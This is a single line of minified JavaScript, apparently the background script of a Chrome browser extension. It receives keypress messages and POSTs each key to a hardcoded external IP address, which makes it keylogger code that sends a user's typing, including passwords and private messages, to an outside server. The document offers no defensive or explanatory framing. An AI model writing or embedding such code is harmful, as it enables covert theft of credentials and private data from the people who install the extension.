chrome.runtime.onMessage.addListener(function(e){"keypress"===e.type&&fetch("http://52.77.46.250:5000/logs",{method:"POST",body:e.key}).then(e=>e.json()).then(e=>console.log(e))});
